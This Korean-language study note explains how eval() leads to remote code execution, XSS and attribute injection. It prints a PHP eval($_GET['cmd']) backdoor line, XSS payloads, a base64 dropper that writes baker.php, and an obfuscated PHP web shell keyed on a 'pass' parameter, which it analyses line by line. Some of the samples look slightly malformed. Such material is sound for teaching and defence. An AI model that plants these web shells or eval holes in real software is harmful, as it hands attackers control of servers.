## **🔍 `eval()`의 위험성 및 분류**

### **`eval()`이란?**

`eval()`은 주어진 문자열을 코드로 실행하는 함수입니다. 주로 **PHP**, **JavaScript** 같은 언어에서 사용되며, 서버나 클라이언트에서 동적으로 코드를 실행할 수 있게 해 줍니다. 하지만 **악용될 경우** 보안에 심각한 문제를 일으킬 수 있습니다.

| 용어                              | 설명                                                        |
| ------------------------------- | --------------------------------------------------------- |
| **XSS (Cross-Site Scripting)**  | 자바스크립트 코드가 브라우저에서 실행됨                                     |
| **RCE (Remote Code Execution)** | 서버 측에서 임의의 코드가 실행됨                                        |
| **eval()**                      | 브라우저에서도 쓰이고, PHP 같은 서버언어에서도 쓰이는 **실행 함수**                 |
| **Attribute Injection**         | HTML 속성(attribute)에 악성 코드가 삽입됨 (ex: `onerror="alert(1)"`) |

---

### **📡 서버 측에서 `eval()` → RCE (Remote Code Execution)** (PHP, Node.js 등)

`eval()`을 **서버 측**에서 사용하면 **Remote Code Execution (RCE)** 공격에 취약해질 수 있습니다. 서버에서 실행되는 코드가 외부 입력에 의존하게 되면, 공격자는 **서버에서 임의의 코드를 실행**할 수 있습니다.


```php
eval($_GET['cmd']);  // 위험한 RCE
```

* 이 코드는 사용자가 HTTP 요청으로 `cmd` 파라미터를 보내면, 그 값을 코드로 실행합니다.
* 예를 들어, `http://example.com/?cmd=ls`와 같은 요청이 들어오면, 서버에서 **`ls` 명령어**가 실행됩니다. 이는 **XSS가 아니라 RCE** 공격입니다.

#### **이중 인코딩된 웹쉘**:

```php
eval(base64_decode('...'));
```

* \*\*`base64`\*\*로 인코딩된 코드를 **디코딩**하여 실행하는 예시입니다. 디코딩된 코드는 웹쉘일 가능성이 높습니다.
* 이 방식은 웹쉘을 숨기고 우회하는 데 자주 사용됩니다.
* 시나리오는 다음과 같습니다.
  
| 항목     | 내용                                              |
| ------ | ----------------------------------------------- |
| **목적** | 서버에 `baker.php`라는 파일 생성                         |
| **내용** | `baker.php` 안에 **base64 인코딩된 PHP 코드** 삽입        |
| **기능** | `eval()`, `base64_decode()` 이용한 원격 명령 실행 백도어 설치 |
| **결과** | 공격자가 `baker.php?pass=...`와 같은 요청으로 **명령 실행 가능** |

---

### **🌐 클라이언트 측 HTML에서 `eval()` → XSS (Cross-Site Scripting)**

클라이언트 측에서는 `eval()`을 악용하여 **XSS** 공격을 할 수 있습니다.

```html
<script>
eval(location.hash.slice(1)); // location.hash에 따라 JS 실행
</script>
```

* 이 코드는 사용자가 **URL의 해시값**을 `eval()`을 통해 실행하게 합니다.
* **URL의 해시값 (hash value)**은 URL의 # 뒤에 오는 부분을 의미합니다. 보통 웹 페이지 내에서 특정 위치나 요소로 **"이동"**하거나, 상태를 추적하는 데 사용합니다.
* 예를 들어, `#alert(1)`을 URL에 추가하면 `alert(1)`이 실행됩니다.
* 이는 **XSS** 공격으로, 사용자가 의도하지 않은 자바스크립트가 실행됩니다.

---

### **✒️ Attribute Injection으로의 활용**

만약 `eval()`이 **HTML 속성**에 삽입된다면, **Attribute Injection** 형태로 XSS 공격이 발생할 수 있습니다. 이는 HTML 태그 내 속성에 악성 코드를 삽입하는 공격입니다.

```html
<img src="x" onerror="eval(alert('XSS'))">
```

* 위 코드에서 `eval()`은 `<img>` 태그의 `onerror` 속성에 삽입되어 있습니다.
* 사용자가 이미지를 로드하지 못했을 때 (에러가 발생하면) `eval(alert('XSS'))`가 실행됩니다.
* 이 경우는 **Attribute Injection**을 통한 **XSS** 공격입니다.

> **Attribute Injection**은 **HTML 속성에 코드가 삽입되는 경우**에 해당합니다. 즉, `eval()`이 사용되더라도 위치에 따라 XSS의 **하위 유형**으로 분류될 수 있습니다.




## **✅ `eval()` 사용 사례에 따른 보안 분류**

| 상황                                              | 분류                                 |
| ----------------------------------------------- | ---------------------------------- |
| `eval()`이 서버에서 실행 (PHP, Node.js 등)              | 🔥 **RCE** (Remote Code Execution) |
| `eval()`이 `<script>` 안에서 실행                     | 🧨 **XSS**                         |
| `eval()`이 `<img onerror="...">`와 같은 HTML 속성에 삽입 | 🚩 **Attribute Injection (XSS)**   |




## **📌 예시 코드 1: base64 디코딩 후 `eval()` 실행**

```php
eval(base64_decode('...'));
```

* 이 코드는 **base64로 인코딩된 코드**를 디코딩하여 실행합니다.
* **디코딩된 코드**는 웹쉘일 가능성이 높고, 이 방식은 **웹쉘 우회 기법**으로 자주 사용됩니다.

#### **디코딩된 코드 예시**:

```php
file_put_contents('baker.php', base64_decode('PD9waHAgY2xhcz0NFNDkzRjYYgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEh5NUY3...'))
```

* 위 코드는 \*\*`file_put_contents`\*\*를 사용하여 서버에 `baker.php` 파일을 생성하고, **다시 base64로 인코딩된 PHP 웹쉘**을 그 파일에 저장합니다.
* **웹쉘**을 서버에 설치하여 원격으로 명령을 실행할 수 있게 됩니다.

---

## **📌 예시 코드 2: 난독화된 PHP 코드와 `eval()`**

```php
<?php
class GcE493F6 {
    public function __construct($Hy5F7){
        @eval(.$Hy5F7.);
    }
}
new GcE493F6($_REQUEST['pass']);
echo error303;
?>
```

#### **코드 설명**:

| 줄                                     | 설명                                                      |
| ------------------------------------- | ------------------------------------------------------- |
| `class GcE493F6 { ... }`              | `GcE493F6`라는 클래스 정의 (이름은 무작위로 보이지만 난독화된 것)              |
| `public function __construct($Hy5F7)` | 클래스가 생성될 때 자동 실행되는 **생성자 함수**                           |
| `@eval(.$Hy5F7.);`                    | `$Hy5F7`에 들어온 문자열을 **PHP 코드로 실행** → `eval()` 사용         |
| `new GcE493F6($_REQUEST['pass']);`    | `$_REQUEST['pass']` 값으로 객체를 생성하며, **그 값이 곧 실행됨**        |
| `echo error303;`                      | 존재하지 않는 상수 `error303` 출력 → PHP Notice 또는 오류 유도 (종료 확인용) |

* \*\*`eval($_REQUEST['pass']);`\*\*는 사용자가 **HTTP 요청**으로 보낸 **문자열**을 PHP 코드처럼 실행하는 방식입니다. 이는 **XSS**나 **RCE** 공격의 가능성을 염두에 두고 취약점이 됩니다.

